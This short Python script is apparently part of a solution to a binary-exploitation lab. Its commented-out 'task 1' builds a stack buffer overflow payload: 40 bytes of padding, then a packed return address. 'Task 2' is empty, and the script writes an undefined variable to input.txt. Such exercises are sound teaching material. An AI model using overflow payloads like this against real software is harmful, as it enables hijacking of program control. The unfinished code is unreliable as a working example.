#!/usr/bin/env python3
import sys
import struct

def p64(n):
    return n.to_bytes(8, "little")

## task 1
#  intro = b"A" * 40
#  addr  = p64(0x400b96)
#  task1 = b"1\n" + intro + addr + b"\n"

## task 2

with open("input.txt", "wb") as f:
    f.write(exploit)
